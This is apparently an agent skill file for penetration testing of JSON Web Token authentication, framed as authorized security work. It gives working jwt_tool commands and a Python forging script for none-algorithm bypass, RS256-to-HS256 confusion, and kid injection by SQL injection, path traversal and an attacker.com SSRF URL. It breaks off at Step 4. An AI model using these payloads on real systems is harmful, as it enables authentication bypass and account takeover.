---
name: testing-for-json-web-token-vulnerabilities
description: "Tests JWT algorithm confusion and none algorithm bypass. Signals: API attacks, interface testing, GraphQL."
zh-signals: "Tests JWT implementations for algorithm confusion, \'none\' algorithm bypass 信号:api攻击,接口测试,graphql。"
when-to-use: Tests JWT implementations for algorithm confusion, "none" algorithm bypass,
  kid/jku parameter injection, and weak secret exploitation using jwt_tool and Burp Suite's
  JWT Editor extension, aiming to achieve authentication bypass and privilege escalation.
  Use when assessing JWT-based auth/session management, OAuth2/OIDC token handling, or
  SSO systems during a security engagement.
domain: cybersecurity
subdomain: web-application-security
tags:
- jwt
- json-web-token
- algorithm-confusion
- authentication-bypass
- token-forgery
- kid-injection
- jku-attack
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1068
---

# Testing for JSON Web Token Vulnerabilities

## When to Use
- When testing applications using JWT for authentication and session management
- During API security assessments where JWTs are used for authorization
- When evaluating OAuth 2.0 or OpenID Connect implementations using JWT
- During penetration testing of single sign-on (SSO) systems
- When auditing JWT library configurations for known vulnerabilities

## Prerequisites
- jwt_tool (Python JWT exploitation toolkit)
- Burp Suite with JWT Editor extension
- jwt.io for decoding and inspecting JWT structure
- Understanding of JWT structure (header.payload.signature) and algorithms (HS256, RS256)
- hashcat or john for brute-forcing weak JWT secrets
- Python PyJWT library for custom JWT forging scripts
- Access to application using JWT-based authentication


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1 — Decode and Analyze JWT Structure
```bash
# Install jwt_tool
pip install pyjwt
git clone https://github.com/ticarpi/jwt_tool.git

# Decode JWT without verification
python3 jwt_tool.py <JWT_TOKEN>

# Decode manually with base64
echo "<header_base64>" | base64 -d
echo "<payload_base64>" | base64 -d

# Examine JWT in jwt.io
# Check: algorithm (alg), key ID (kid), issuer (iss), audience (aud)
# Check: expiration (exp), not-before (nbf), claims (role, admin, etc.)

# Example JWT header inspection
# {"alg":"RS256","typ":"JWT","kid":"key-1"}
# Look for: alg, kid, jku, jwk, x5u, x5c headers
```

### Step 2 — Test "None" Algorithm Bypass
```bash
# Change algorithm to "none" and remove signature
python3 jwt_tool.py <JWT_TOKEN> -X a

# Manual none algorithm attack:
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}
# Encode new header, keep payload, remove signature (empty string after last dot)

# Variations to try:
# "alg": "none"
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"

# Send forged token
curl -H "Authorization: Bearer <FORGED_TOKEN>" http://target.com/api/admin

# jwt_tool automated none attack
python3 jwt_tool.py <JWT_TOKEN> -X a -I -pc role -pv admin
```

### Step 3 — Test Algorithm Confusion (RS256 to HS256)
```bash
# If server uses RS256, attempt to switch to HS256 using public key as HMAC secret

# Step 1: Obtain the public key
# From JWKS endpoint
curl http://target.com/.well-known/jwks.json

# From SSL certificate
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > public_key.pem

# Step 2: Forge token using public key as HMAC secret
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

# Manual algorithm confusion:
# Change header from {"alg":"RS256"} to {"alg":"HS256"}
# Sign with public key using HMAC-SHA256
python3 -c "
import jwt
with open('public_key.pem', 'r') as f:
    public_key = f.read()
payload = {'sub': 'admin', 'role': 'admin', 'iat': 1700000000, 'exp': 1900000000}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
"
```

### Step 4 — Test Key ID (kid) Parameter Injection
```bash
# SQL Injection via kid
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "' UNION SELECT 'secret-key' FROM dual--" \
  -S hs256 -p "secret-key"

# Path Traversal via kid
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../dev/null" \
  -S hs256 -p ""

# Kid pointing to empty file (sign with empty string)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SSRF via kid (if kid fetches remote key)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "http://attacker.com/key"

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
